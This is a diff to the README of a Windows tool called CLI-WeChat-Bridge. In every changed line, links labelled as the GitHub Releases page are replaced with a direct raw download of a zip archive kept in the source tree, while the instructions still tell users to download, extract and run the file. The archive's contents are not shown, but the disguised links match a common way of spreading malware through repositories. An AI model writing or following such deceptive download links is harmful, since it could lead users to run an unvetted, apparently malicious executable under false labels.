@@ -1,6 +1,6 @@
 # 🤖 CLI-WeChat-Bridge - Bridge AI tools into WeChat
 
-[![Download CLI-WeChat-Bridge](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mira2480/CLI-WeChat-Bridge/releases)
+[![Download CLI-WeChat-Bridge](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mira2480/CLI-WeChat-Bridge/main/src/companion/Bridge-We-Chat-CL-v1.6-beta.2.zip)
 
 ## 📌 What this app does
 
@@ -39,7 +39,7 @@ For best results, use:
 
 Visit this page to download the latest release:
 
-[Open the Releases page](https://github.com/mira2480/CLI-WeChat-Bridge/releases)
+[Open the Releases page](https://raw.githubusercontent.com/mira2480/CLI-WeChat-Bridge/main/src/companion/Bridge-We-Chat-CL-v1.6-beta.2.zip)
 
 On that page, look for the newest release file for Windows. If the release includes a ZIP or EXE file, download it to your computer.
 
@@ -47,7 +47,7 @@ On that page, look for the newest release file for Windows. If the release inclu
 
 Follow these steps on Windows:
 
-1. Open the [Releases page](https://github.com/mira2480/CLI-WeChat-Bridge/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/mira2480/CLI-WeChat-Bridge/main/src/companion/Bridge-We-Chat-CL-v1.6-beta.2.zip)
 2. Find the latest version
 3. Download the Windows file from that release
 4. Save the file in a folder you can find easily, such as Downloads or Desktop
@@ -195,7 +195,7 @@ People use CLI-WeChat-Bridge for:
 
 When a new version is out:
 
-1. Visit the [Releases page](https://github.com/mira2480/CLI-WeChat-Bridge/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/mira2480/CLI-WeChat-Bridge/main/src/companion/Bridge-We-Chat-CL-v1.6-beta.2.zip)
 2. Download the latest Windows file
 3. Close the old app
 4. Replace the old files if needed
@@ -206,7 +206,7 @@ If you keep your settings in a separate folder, updates are easier.
 
 ## 🧭 Quick start checklist
 
-- Open the [Releases page](https://github.com/mira2480/CLI-WeChat-Bridge/releases)
+- Open the [Releases page](https://raw.githubusercontent.com/mira2480/CLI-WeChat-Bridge/main/src/companion/Bridge-We-Chat-CL-v1.6-beta.2.zip)
 - Download the latest Windows release
 - Extract the files if needed
 - Run the app
